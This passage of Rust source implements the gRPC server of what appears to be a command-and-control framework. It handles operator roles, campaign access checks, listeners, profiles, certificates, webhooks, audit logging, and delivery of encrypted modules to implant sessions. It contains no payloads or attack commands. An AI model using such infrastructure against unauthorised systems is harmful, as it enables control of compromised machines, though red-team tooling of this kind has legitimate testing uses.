use std::pin::Pin;
use std::sync::Arc;

use tokio::sync::mpsc;
use tokio_stream::wrappers::ReceiverStream;
use tokio_stream::Stream;
use tonic::{Request, Response, Status};

use specter_common::proto::specter::v1::specter_service_server::SpecterService;
use specter_common::proto::specter::v1::*;

use crate::audit::{AuditAction, AuditLog};
use crate::auth::ca::EmbeddedCA;
use crate::auth::{AuthService, OperatorContext};
use crate::campaign::CampaignManager;
use crate::collaboration::chat::ChatService;
use crate::collaboration::PresenceManager;
use crate::event::webhooks::WebhookManager;
use crate::event::{EventBus, SpecterEvent};
use crate::listener::azure_listener::AzureListenerManager;
use crate::listener::ListenerManager;
use crate::module::ModuleRepository;
use crate::profile::ProfileStore;
use crate::redirector::RedirectorOrchestrator;
use crate::reports::ReportGenerator;
use crate::session::SessionManager;
use crate::task::TaskDispatcher;

pub struct SpecterGrpcService {
    session_manager: Arc<SessionManager>,
    task_dispatcher: Arc<TaskDispatcher>,
    listener_manager: Arc<ListenerManager>,
    event_bus: Arc<EventBus>,
    auth_service: Arc<AuthService>,
    module_repository: Arc<ModuleRepository>,
    profile_store: Arc<ProfileStore>,
    ca: Option<Arc<EmbeddedCA>>,
    audit_log: Arc<AuditLog>,
    webhook_manager: Arc<WebhookManager>,
    campaign_manager: Arc<CampaignManager>,
    azure_listener_manager: Option<Arc<AzureListenerManager>>,
    redirector_orchestrator: Option<Arc<RedirectorOrchestrator>>,
    presence_manager: Arc<PresenceManager>,
    chat_service: Arc<ChatService>,
    report_generator: Arc<ReportGenerator>,
}

impl SpecterGrpcService {
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        session_manager: Arc<SessionManager>,
        task_dispatcher: Arc<TaskDispatcher>,
        listener_manager: Arc<ListenerManager>,
        event_bus: Arc<EventBus>,
        auth_service: Arc<AuthService>,
        module_repository: Arc<ModuleRepository>,
        profile_store: Arc<ProfileStore>,
        audit_log: Arc<AuditLog>,
        webhook_manager: Arc<WebhookManager>,
        campaign_manager: Arc<CampaignManager>,
        presence_manager: Arc<PresenceManager>,
        chat_service: Arc<ChatService>,
        report_generator: Arc<ReportGenerator>,
    ) -> Self {
        Self {
            session_manager,
            task_dispatcher,
            listener_manager,
            event_bus,
            auth_service,
            module_repository,
            profile_store,
            ca: None,
            audit_log,
            webhook_manager,
            campaign_manager,
            azure_listener_manager: None,
            redirector_orchestrator: None,
            presence_manager,
            chat_service,
            report_generator,
        }
    }

    pub fn with_ca(mut self, ca: Arc<EmbeddedCA>) -> Self {
        self.ca = Some(ca);
        self
    }

    pub fn with_azure_listener_manager(mut self, m: Arc<AzureListenerManager>) -> Self {
        self.azure_listener_manager = Some(m);
        self
    }

    pub fn with_redirector_orchestrator(mut self, o: Arc<RedirectorOrchestrator>) -> Self {
        self.redirector_orchestrator = Some(o);
        self
    }
}

/// Extract the authenticated operator context from gRPC request extensions.
#[allow(clippy::result_large_err)]
fn require_auth<T>(request: &Request<T>) -> Result<OperatorContext, Status> {
    request
        .extensions()
        .get::<OperatorContext>()
        .cloned()
        .ok_or_else(|| Status::unauthenticated("Authentication required"))
}

/// Extract operator context and verify permission for the given action.
#[allow(clippy::result_large_err)]
fn require_permission<T>(request: &Request<T>, action: &str) -> Result<OperatorContext, Status> {
    let ctx = require_auth(request)?;
    if !AuthService::check_permission(&ctx.role, action) {
        return Err(Status::permission_denied(format!(
            "Role '{}' cannot perform '{}'",
            ctx.role, action
        )));
    }
    Ok(ctx)
}

#[tonic::async_trait]
impl SpecterService for SpecterGrpcService {
    // ── Sessions ─────────────────────────────────────────────────────────

    async fn list_sessions(
        &self,
        request: Request<ListSessionsRequest>,
    ) -> Result<Response<ListSessionsResponse>, Status> {
        let ctx = require_permission(&request, "list_sessions")?;
        let mut sessions = self
            .session_manager
            .list_sessions()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        // Filter sessions by campaign-based access
        if let Ok(Some(accessible_ids)) = self
            .campaign_manager
            .get_accessible_session_ids(&ctx.operator_id, &ctx.role)
            .await
        {
            sessions.retain(|s| accessible_ids.contains(&s.id));
        }

        Ok(Response::new(ListSessionsResponse { sessions }))
    }

    async fn get_session(
        &self,
        request: Request<GetSessionRequest>,
    ) -> Result<Response<GetSessionResponse>, Status> {
        let ctx = require_permission(&request, "get_session")?;
        let id = &request.get_ref().id;

        // Check campaign-based access
        let access = self
            .campaign_manager
            .check_session_access(&ctx.operator_id, &ctx.role, id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        if access.is_none() {
            return Err(Status::permission_denied(
                "No campaign access to this session",
            ));
        }

        let session = self
            .session_manager
            .get_session(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        Ok(Response::new(GetSessionResponse { session }))
    }

    // ── Tasks ────────────────────────────────────────────────────────────

    async fn queue_task(
        &self,
        request: Request<QueueTaskRequest>,
    ) -> Result<Response<QueueTaskResponse>, Status> {
        let ctx = require_permission(&request, "queue_task")?;

        let req = request.into_inner();

        // Check campaign-based access (must have Full access to queue tasks)
        let access = self
            .campaign_manager
            .check_session_access(&ctx.operator_id, &ctx.role, &req.session_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        match access {
            None => {
                return Err(Status::permission_denied(
                    "No campaign access to this session",
                ));
            }
            Some(crate::campaign::AccessLevel::ReadOnly) => {
                return Err(Status::permission_denied(
                    "Read-only campaign access — cannot queue tasks",
                ));
            }
            Some(crate::campaign::AccessLevel::Full) => {}
        }
        let priority = TaskPriority::try_from(req.priority).unwrap_or(TaskPriority::Normal);

        let task_id = self
            .task_dispatcher
            .queue_task(
                &req.session_id,
                &req.task_type,
                &req.arguments,
                priority,
                &req.operator_id,
            )
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let task = self
            .task_dispatcher
            .get_task(&task_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::TaskQueue,
                &req.session_id,
                &serde_json::json!({"task_id": task_id, "task_type": req.task_type}),
            )
            .await;

        Ok(Response::new(QueueTaskResponse { task_id, task }))
    }

    async fn get_task_result(
        &self,
        request: Request<GetTaskResultRequest>,
    ) -> Result<Response<GetTaskResultResponse>, Status> {
        require_permission(&request, "get_task")?;
        let task = self
            .task_dispatcher
            .get_task(&request.get_ref().task_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        Ok(Response::new(GetTaskResultResponse { task }))
    }

    async fn list_tasks(
        &self,
        request: Request<ListTasksRequest>,
    ) -> Result<Response<ListTasksResponse>, Status> {
        let ctx = require_permission(&request, "list_tasks")?;
        let session_id = &request.get_ref().session_id;

        // Check campaign-based access for the session
        if !session_id.is_empty() {
            let access = self
                .campaign_manager
                .check_session_access(&ctx.operator_id, &ctx.role, session_id)
                .await
                .map_err(|e| Status::internal(e.to_string()))?;
            if access.is_none() {
                return Err(Status::permission_denied(
                    "No campaign access to this session",
                ));
            }
        }

        let tasks = self
            .task_dispatcher
            .list_tasks(session_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        Ok(Response::new(ListTasksResponse { tasks }))
    }

    // ── Listeners ────────────────────────────────────────────────────────

    async fn create_listener(
        &self,
        request: Request<CreateListenerRequest>,
    ) -> Result<Response<CreateListenerResponse>, Status> {
        let ctx = require_permission(&request, "create_listener")?;
        let req = request.into_inner();
        let listener = self
            .listener_manager
            .create_listener(&req.name, &req.bind_address, req.port, &req.protocol)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::ListenerCreate,
                &listener.id,
                &serde_json::json!({"name": req.name, "port": req.port, "protocol": req.protocol}),
            )
            .await;

        Ok(Response::new(CreateListenerResponse {
            listener: Some(listener),
        }))
    }

    async fn list_listeners(
        &self,
        request: Request<ListListenersRequest>,
    ) -> Result<Response<ListListenersResponse>, Status> {
        require_permission(&request, "list_listeners")?;
        let listeners = self
            .listener_manager
            .list_listeners()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        Ok(Response::new(ListListenersResponse { listeners }))
    }

    async fn start_listener(
        &self,
        request: Request<StartListenerRequest>,
    ) -> Result<Response<StartListenerResponse>, Status> {
        let ctx = require_permission(&request, "start_listener")?;
        let id = request.get_ref().id.clone();
        let listener = self
            .listener_manager
            .start_listener(&id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::ListenerStart,
                &id,
                &serde_json::json!({}),
            )
            .await;

        Ok(Response::new(StartListenerResponse {
            listener: Some(listener),
        }))
    }

    async fn stop_listener(
        &self,
        request: Request<StopListenerRequest>,
    ) -> Result<Response<StopListenerResponse>, Status> {
        let ctx = require_permission(&request, "stop_listener")?;
        let id = request.get_ref().id.clone();
        let listener = self
            .listener_manager
            .stop_listener(&id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::ListenerStop,
                &id,
                &serde_json::json!({}),
            )
            .await;

        Ok(Response::new(StopListenerResponse {
            listener: Some(listener),
        }))
    }

    async fn delete_listener(
        &self,
        request: Request<DeleteListenerRequest>,
    ) -> Result<Response<DeleteListenerResponse>, Status> {
        let ctx = require_permission(&request, "delete_listener")?;
        let id = request.get_ref().id.clone();
        self.listener_manager
            .delete_listener(&id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::ListenerDelete,
                &id,
                &serde_json::json!({}),
            )
            .await;

        Ok(Response::new(DeleteListenerResponse {}))
    }

    // ── Operators ────────────────────────────────────────────────────────

    async fn authenticate(
        &self,
        request: Request<AuthenticateRequest>,
    ) -> Result<Response<AuthenticateResponse>, Status> {
        // Authenticate does not require an existing token.
        let req = request.into_inner();
        match self
            .auth_service
            .authenticate(&req.username, &req.token)
            .await
        {
            Ok((operator, token)) => {
                let op_id = operator.id.clone();
                let _ = self
                    .audit_log
                    .append(
                        &op_id,
                        AuditAction::OperatorAuth,
                        &req.username,
                        &serde_json::json!({"success": true}),
                    )
                    .await;
                Ok(Response::new(AuthenticateResponse {
                    success: true,
                    operator: Some(operator),
                    auth_token: token,
                }))
            }
            Err(_) => {
                let _ = self
                    .audit_log
                    .append(
                        "unknown",
                        AuditAction::OperatorAuth,
                        &req.username,
                        &serde_json::json!({"success": false}),
                    )
                    .await;
                Ok(Response::new(AuthenticateResponse {
                    success: false,
                    operator: None,
                    auth_token: String::new(),
                }))
            }
        }
    }

    async fn list_operators(
        &self,
        request: Request<ListOperatorsRequest>,
    ) -> Result<Response<ListOperatorsResponse>, Status> {
        require_permission(&request, "list_operators")?;
        let operators = self
            .auth_service
            .list_operators()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        Ok(Response::new(ListOperatorsResponse { operators }))
    }

    // ── Profiles ─────────────────────────────────────────────────────────

    async fn create_profile(
        &self,
        request: Request<CreateProfileRequest>,
    ) -> Result<Response<CreateProfileResponse>, Status> {
        let ctx = require_permission(&request, "create_profile")?;
        let req = request.into_inner();
        let stored = self
            .profile_store
            .create_profile(&req.name, &req.description, &req.yaml_content)
            .await
            .map_err(|e| Status::invalid_argument(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::ProfileCreate,
                &stored.id,
                &serde_json::json!({"name": req.name}),
            )
            .await;

        Ok(Response::new(CreateProfileResponse {
            profile: Some(stored_to_proto(stored)),
        }))
    }

    async fn list_profiles(
        &self,
        request: Request<ListProfilesRequest>,
    ) -> Result<Response<ListProfilesResponse>, Status> {
        require_permission(&request, "list_profiles")?;
        let profiles = self
            .profile_store
            .list_profiles()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(ListProfilesResponse {
            profiles: profiles.into_iter().map(stored_to_proto).collect(),
        }))
    }

    async fn get_profile(
        &self,
        request: Request<GetProfileRequest>,
    ) -> Result<Response<GetProfileResponse>, Status> {
        require_permission(&request, "get_profile")?;
        let id = &request.get_ref().id;
        let profile = self
            .profile_store
            .get_profile(id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?
            .ok_or_else(|| Status::not_found(format!("profile not found: {id}")))?;

        Ok(Response::new(GetProfileResponse {
            profile: Some(stored_to_proto(profile)),
        }))
    }

    async fn compile_profile(
        &self,
        request: Request<CompileProfileRequest>,
    ) -> Result<Response<CompileProfileResponse>, Status> {
        let ctx = require_permission(&request, "compile_profile")?;
        let id = request.get_ref().id.clone();
        let blob = self
            .profile_store
            .compile_profile_by_id(&id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::ProfileCompile,
                &id,
                &serde_json::json!({}),
            )
            .await;

        Ok(Response::new(CompileProfileResponse {
            compiled_blob: blob,
        }))
    }

    // ── Certificates ───────────────────────────────────────────────────

    async fn issue_operator_certificate(
        &self,
        request: Request<IssueOperatorCertificateRequest>,
    ) -> Result<Response<IssueOperatorCertificateResponse>, Status> {
        let ctx = require_permission(&request, "manage_operators")?;

        let ca = self
            .ca
            .as_ref()
            .ok_or_else(|| Status::unavailable("CA not initialized (dev-mode?)"))?;

        let req = request.into_inner();
        let validity = if req.validity_days == 0 {
            365
        } else {
            req.validity_days
        };

        let bundle = ca
            .issue_operator_cert(&req.username, &req.role, validity)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::CertIssue,
                &req.username,
                &serde_json::json!({"serial": bundle.serial, "role": req.role, "validity_days": validity}),
            )
            .await;

        Ok(Response::new(IssueOperatorCertificateResponse {
            cert_pem: bundle.cert_pem,
            key_pem: bundle.key_pem,
            ca_cert_pem: bundle.ca_cert_pem,
            serial: bundle.serial,
        }))
    }

    async fn revoke_operator_certificate(
        &self,
        request: Request<RevokeOperatorCertificateRequest>,
    ) -> Result<Response<RevokeOperatorCertificateResponse>, Status> {
        let ctx = require_permission(&request, "manage_operators")?;

        let ca = self
            .ca
            .as_ref()
            .ok_or_else(|| Status::unavailable("CA not initialized (dev-mode?)"))?;

        let serial = request.into_inner().serial;
        ca.revoke_cert(&serial)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::CertRevoke,
                &serial,
                &serde_json::json!({}),
            )
            .await;

        Ok(Response::new(RevokeOperatorCertificateResponse {
            success: true,
        }))
    }

    async fn list_operator_certificates(
        &self,
        request: Request<ListOperatorCertificatesRequest>,
    ) -> Result<Response<ListOperatorCertificatesResponse>, Status> {
        require_permission(&request, "list_operators")?;

        let ca = self
            .ca
            .as_ref()
            .ok_or_else(|| Status::unavailable("CA not initialized (dev-mode?)"))?;

        let certs = ca
            .list_certificates()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let certificates = certs
            .into_iter()
            .map(|c| CertificateInfo {
                serial: c.serial,
                subject_cn: c.subject_cn,
                subject_ou: c.subject_ou,
                issued_at: Some(prost_types::Timestamp {
                    seconds: c.issued_at,
                    nanos: 0,
                }),
                expires_at: Some(prost_types::Timestamp {
                    seconds: c.expires_at,
                    nanos: 0,
                }),
                revoked: c.revoked,
                revoked_at: c.revoked_at.map(|t| prost_types::Timestamp {
                    seconds: t,
                    nanos: 0,
                }),
            })
            .collect();

        Ok(Response::new(ListOperatorCertificatesResponse {
            certificates,
        }))
    }

    async fn get_ca_certificate(
        &self,
        request: Request<GetCaCertificateRequest>,
    ) -> Result<Response<GetCaCertificateResponse>, Status> {
        // Any authenticated user can get the CA cert
        require_auth(&request)?;

        let ca = self
            .ca
            .as_ref()
            .ok_or_else(|| Status::unavailable("CA not initialized (dev-mode?)"))?;

        Ok(Response::new(GetCaCertificateResponse {
            ca_cert_pem: ca.get_root_cert().to_string(),
        }))
    }

    async fn rotate_server_certificate(
        &self,
        request: Request<RotateServerCertificateRequest>,
    ) -> Result<Response<RotateServerCertificateResponse>, Status> {
        let ctx = require_permission(&request, "manage_operators")?;

        let ca = self
            .ca
            .as_ref()
            .ok_or_else(|| Status::unavailable("CA not initialized (dev-mode?)"))?;

        let hostnames = request.into_inner().hostnames;
        let (cert_pem, _key_pem) = ca
            .issue_server_cert(&hostnames)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        // Extract serial from the newly issued cert for the response
        let cert_der = {
            use std::io::BufReader;
            let mut reader = BufReader::new(cert_pem.as_bytes());
            let certs: Vec<_> = rustls_pemfile::certs(&mut reader)
                .filter_map(|r| r.ok())
                .collect();
            certs
                .into_iter()
                .next()
                .map(|c| c.to_vec())
                .unwrap_or_default()
        };
        let serial = if !cert_der.is_empty() {
            crate::auth::mtls::extract_serial_from_cert(&cert_der).unwrap_or_default()
        } else {
            String::new()
        };

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::CertRotate,
                "server",
                &serde_json::json!({"serial": serial, "hostnames": hostnames}),
            )
            .await;

        Ok(Response::new(RotateServerCertificateResponse {
            success: true,
            serial,
        }))
    }

    // ── Webhooks ──────────────────────────────────────────────────────────

    async fn create_webhook(
        &self,
        request: Request<CreateWebhookRequest>,
    ) -> Result<Response<CreateWebhookResponse>, Status> {
        let ctx = require_permission(&request, "manage_operators")?;
        let req = request.into_inner();

        let filters: Vec<String> = if req.event_filters.is_empty() {
            vec![]
        } else {
            serde_json::from_str(&req.event_filters).unwrap_or_default()
        };

        let format = crate::event::webhooks::WebhookFormat::from_proto(req.format);

        let webhook = self
            .webhook_manager
            .create_webhook(&req.name, &req.url, &req.secret, &filters, format)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::WebhookCreate,
                &webhook.id,
                &serde_json::json!({"name": req.name, "url": req.url}),
            )
            .await;

        Ok(Response::new(CreateWebhookResponse {
            webhook: Some(webhook_to_proto(webhook)),
        }))
    }

    async fn list_webhooks(
        &self,
        request: Request<ListWebhooksRequest>,
    ) -> Result<Response<ListWebhooksResponse>, Status> {
        require_permission(&request, "list_operators")?;

        let webhooks = self
            .webhook_manager
            .list_webhooks()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(ListWebhooksResponse {
            webhooks: webhooks.into_iter().map(webhook_to_proto).collect(),
        }))
    }

    async fn delete_webhook(
        &self,
        request: Request<DeleteWebhookRequest>,
    ) -> Result<Response<DeleteWebhookResponse>, Status> {
        let ctx = require_permission(&request, "manage_operators")?;
        let id = request.into_inner().id;

        self.webhook_manager
            .delete_webhook(&id)
            .await
            .map_err(|e| match e {
                crate::event::webhooks::WebhookError::NotFound(_) => {
                    Status::not_found(e.to_string())
                }
                _ => Status::internal(e.to_string()),
            })?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::WebhookDelete,
                &id,
                &serde_json::json!({}),
            )
            .await;

        Ok(Response::new(DeleteWebhookResponse { success: true }))
    }

    async fn test_webhook(
        &self,
        request: Request<TestWebhookRequest>,
    ) -> Result<Response<TestWebhookResponse>, Status> {
        let ctx = require_permission(&request, "manage_operators")?;
        let id = request.into_inner().id;

        let result = self.webhook_manager.test_webhook(&id).await;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::WebhookTest,
                &id,
                &serde_json::json!({"success": result.is_ok()}),
            )
            .await;

        match result {
            Ok(status_msg) => Ok(Response::new(TestWebhookResponse {
                success: true,
                status_message: status_msg,
            })),
            Err(e) => Ok(Response::new(TestWebhookResponse {
                success: false,
                status_message: e.to_string(),
            })),
        }
    }

    // ── Campaigns ──────────────────────────────────────────────────────────

    async fn create_campaign(
        &self,
        request: Request<CreateCampaignRequest>,
    ) -> Result<Response<CreateCampaignResponse>, Status> {
        let ctx = require_permission(&request, "create_listener")?;
        let req = request.into_inner();

        let campaign = self
            .campaign_manager
            .create_campaign(
                &req.name,
                &req.description,
                &ctx.operator_id,
                &req.listener_id,
            )
            .await
            .map_err(|e| match e {
                crate::campaign::CampaignError::AlreadyExists(_) => {
                    Status::already_exists(e.to_string())
                }
                _ => Status::internal(e.to_string()),
            })?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::CampaignCreate,
                &campaign.id,
                &serde_json::json!({"name": req.name, "listener_id": req.listener_id}),
            )
            .await;

        let sessions = self
            .campaign_manager
            .get_campaign_sessions(&campaign.id)
            .await
            .unwrap_or_default();
        let operators = self
            .campaign_manager
            .get_campaign_operators(&campaign.id)
            .await
            .unwrap_or_default();

        Ok(Response::new(CreateCampaignResponse {
            campaign: Some(campaign_to_proto(campaign, sessions, operators)),
        }))
    }

    async fn list_campaigns(
        &self,
        request: Request<ListCampaignsRequest>,
    ) -> Result<Response<ListCampaignsResponse>, Status> {
        require_permission(&request, "list_sessions")?;

        let campaigns = self
            .campaign_manager
            .list_campaigns()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let mut protos = Vec::with_capacity(campaigns.len());
        for c in campaigns {
            let sessions = self
                .campaign_manager
                .get_campaign_sessions(&c.id)
                .await
                .unwrap_or_default();
            let operators = self
                .campaign_manager
                .get_campaign_operators(&c.id)
                .await
                .unwrap_or_default();
            protos.push(campaign_to_proto(c, sessions, operators));
        }

        Ok(Response::new(ListCampaignsResponse { campaigns: protos }))
    }

    async fn get_campaign(
        &self,
        request: Request<GetCampaignRequest>,
    ) -> Result<Response<GetCampaignResponse>, Status> {
        require_permission(&request, "list_sessions")?;
        let id = &request.get_ref().id;

        let campaign = self
            .campaign_manager
            .get_campaign(id)
            .await
            .map_err(|e| match e {
                crate::campaign::CampaignError::NotFound(_) => Status::not_found(e.to_string()),
                _ => Status::internal(e.to_string()),
            })?;

        let sessions = self
            .campaign_manager
            .get_campaign_sessions(&campaign.id)
            .await
            .unwrap_or_default();
        let operators = self
            .campaign_manager
            .get_campaign_operators(&campaign.id)
            .await
            .unwrap_or_default();

        Ok(Response::new(GetCampaignResponse {
            campaign: Some(campaign_to_proto(campaign, sessions, operators)),
        }))
    }

    async fn add_session_to_campaign(
        &self,
        request: Request<AddSessionToCampaignRequest>,
    ) -> Result<Response<AddSessionToCampaignResponse>, Status> {
        let ctx = require_permission(&request, "create_listener")?;
        let req = request.into_inner();

        self.campaign_manager
            .add_session(&req.campaign_id, &req.session_id)
            .await
            .map_err(|e| match e {
                crate::campaign::CampaignError::NotFound(_) => Status::not_found(e.to_string()),
                _ => Status::internal(e.to_string()),
            })?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::CampaignUpdate,
                &req.campaign_id,
                &serde_json::json!({"action": "add_session", "session_id": req.session_id}),
            )
            .await;

        Ok(Response::new(AddSessionToCampaignResponse {
            success: true,
        }))
    }

    async fn add_operator_to_campaign(
        &self,
        request: Request<AddOperatorToCampaignRequest>,
    ) -> Result<Response<AddOperatorToCampaignResponse>, Status> {
        let ctx = require_permission(&request, "manage_operators")?;
        let req = request.into_inner();

        let access_level = crate::campaign::AccessLevel::from_proto(req.access_level);

        self.campaign_manager
            .add_operator(&req.campaign_id, &req.operator_id, access_level)
            .await
            .map_err(|e| match e {
                crate::campaign::CampaignError::NotFound(_) => Status::not_found(e.to_string()),
                _ => Status::internal(e.to_string()),
            })?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::CampaignUpdate,
                &req.campaign_id,
                &serde_json::json!({"action": "add_operator", "operator_id": req.operator_id, "access_level": access_level.as_str()}),
            )
            .await;

        Ok(Response::new(AddOperatorToCampaignResponse {
            success: true,
        }))
    }

    async fn remove_operator_from_campaign(
        &self,
        request: Request<RemoveOperatorFromCampaignRequest>,
    ) -> Result<Response<RemoveOperatorFromCampaignResponse>, Status> {
        let ctx = require_permission(&request, "manage_operators")?;
        let req = request.into_inner();

        self.campaign_manager
            .remove_operator(&req.campaign_id, &req.operator_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::CampaignUpdate,
                &req.campaign_id,
                &serde_json::json!({"action": "remove_operator", "operator_id": req.operator_id}),
            )
            .await;

        Ok(Response::new(RemoveOperatorFromCampaignResponse {
            success: true,
        }))
    }

    async fn remove_session_from_campaign(
        &self,
        request: Request<RemoveSessionFromCampaignRequest>,
    ) -> Result<Response<RemoveSessionFromCampaignResponse>, Status> {
        let ctx = require_permission(&request, "create_listener")?;
        let req = request.into_inner();

        self.campaign_manager
            .remove_session(&req.campaign_id, &req.session_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::CampaignUpdate,
                &req.campaign_id,
                &serde_json::json!({"action": "remove_session", "session_id": req.session_id}),
            )
            .await;

        Ok(Response::new(RemoveSessionFromCampaignResponse {
            success: true,
        }))
    }

    // ── Modules ──────────────────────────────────────────────────────────

    async fn list_modules(
        &self,
        request: Request<ListModulesRequest>,
    ) -> Result<Response<ListModulesResponse>, Status> {
        require_permission(&request, "list_sessions")?;

        let modules = self
            .module_repository
            .list_modules()
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let protos = modules.into_iter().map(stored_module_to_proto).collect();

        Ok(Response::new(ListModulesResponse { modules: protos }))
    }

    async fn get_module_info(
        &self,
        request: Request<GetModuleInfoRequest>,
    ) -> Result<Response<GetModuleInfoResponse>, Status> {
        require_permission(&request, "list_sessions")?;
        let name = &request.get_ref().name;

        let module = self
            .module_repository
            .get_module_by_name(name)
            .await
            .map_err(|e| Status::internal(e.to_string()))?
            .ok_or_else(|| Status::not_found(format!("Module not found: {name}")))?;

        Ok(Response::new(GetModuleInfoResponse {
            module: Some(stored_module_to_proto(module)),
        }))
    }

    async fn load_module(
        &self,
        request: Request<LoadModuleRequest>,
    ) -> Result<Response<LoadModuleResponse>, Status> {
        let ctx = require_permission(&request, "queue_task")?;
        let req = request.into_inner();

        // Verify campaign access
        let access = self
            .campaign_manager
            .check_session_access(&ctx.operator_id, &ctx.role, &req.session_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        match access {
            None => {
                return Err(Status::permission_denied(
                    "No campaign access to this session",
                ));
            }
            Some(crate::campaign::AccessLevel::ReadOnly) => {
                return Err(Status::permission_denied(
                    "Read-only campaign access — cannot load modules",
                ));
            }
            Some(crate::campaign::AccessLevel::Full) => {}
        }

        // Find module by name
        let module_id = self
            .module_repository
            .get_module_id_by_name(&req.module_name)
            .await
            .map_err(|e| Status::internal(e.to_string()))?
            .ok_or_else(|| Status::not_found(format!("Module not found: {}", req.module_name)))?;

        // Get session's X25519 public key for packaging
        let pubkey_bytes = self
            .session_manager
            .get_implant_pubkey(&req.session_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?
            .ok_or_else(|| Status::failed_precondition("Session has no implant public key"))?;

        let mut session_pubkey = [0u8; 32];
        if pubkey_bytes.len() == 32 {
            session_pubkey.copy_from_slice(&pubkey_bytes);
        } else {
            return Err(Status::internal("Invalid session public key length"));
        }

        // Package the module (encrypt + sign for this session)
        let package = self
            .module_repository
            .package_module(&module_id, &session_pubkey)
            .await
            .map_err(Status::internal)?;

        // Build task arguments: [module_name]\n[user_args]
        // The task payload is the encrypted module package
        let mut task_args = package;
        // Append the user arguments after the package
        if !req.arguments.is_empty() {
            task_args.push(0x00); // separator
            task_args.extend_from_slice(&req.arguments);
        }

        // Queue as a module_load task
        let task_id = self
            .task_dispatcher
            .queue_task(
                &req.session_id,
                "module_load",
                &task_args,
                TaskPriority::Normal,
                &ctx.operator_id,
            )
            .await
            .map_err(|e| Status::internal(e.to_string()))?;

        let _ = self
            .audit_log
            .append(
                &ctx.operator_id,
                AuditAction::ModuleLoad,
                &req.session_id,
                &serde_json::json!({"task_id": task_id, "module": req.module_name}),
            )
            .await;

        Ok(Response::new(LoadModuleResponse {
            task_id,
            success: true,
            message: format!("Module '{}' queued for delivery", req.module_name),
        }))
    }

    // ── Events stream ────────────────────────────────────────────────────

    type SubscribeEventsStream =
        Pin<Box<dyn Stream<Item = Result<Event, Status>> + Send + 'static>>;

    async fn subscribe_events(
        &self,
        request: Request<SubscribeEventsRequest>,
    ) -> Result<Response<Self::SubscribeEventsStream>, Status> {
        require_permission(&request, "subscribe_events")?;

        let (tx, rx) = mpsc::channel(128);
        let mut event_rx = self.event_bus.subscribe();

        tokio::spawn(async move {
            loop {
                match event_rx.recv().await {
                    Ok(event) => {
                        let proto_event = convert_event(event);
                        if tx.send(Ok(proto_event)).await.is_err() {
                            break;
                        }
                    }
                    Err(tokio::sync::broadcast::error::RecvError::Lagged(n)) => {
                        tracing::warn!("Event subscriber lagged, skipped {n} events");
                    }
                    Err(tokio::sync::broadcast::error::RecvError::Closed) => break,
                }
            }
        });

        Ok(Response::new(Box::pin(ReceiverStream::new(rx))))
    }

    // ── Collaboration — Presence ──────────────────────────────────────────

    async fn update_presence(
        &self,
        request: Request<UpdatePresenceRequest>,
    ) -> Result<Response<UpdatePresenceResponse>, Status> {
        let ctx = require_auth(&request)?;
        let req = request.into_inner();

        self.presence_manager
            .update_active_session(&ctx.operator_id, &req.active_session_id)
            .await;

        Ok(Response::new(UpdatePresenceResponse {}))
    }

    async fn get_active_operators(
        &self,
        request: Request<GetActiveOperatorsRequest>,
    ) -> Result<Response<GetActiveOperatorsResponse>, Status> {
        require_auth(&request)?;

        let operators = self.presence_manager.get_active_operators().await;
        Ok(Response::new(GetActiveOperatorsResponse { operators }))
    }

    type SubscribePresenceStream =
        Pin<Box<dyn Stream<Item = Result<PresenceUpdate, Status>> + Send + 'static>>;

    async fn subscribe_presence(
        &self,
        request: Request<SubscribePresenceRequest>,
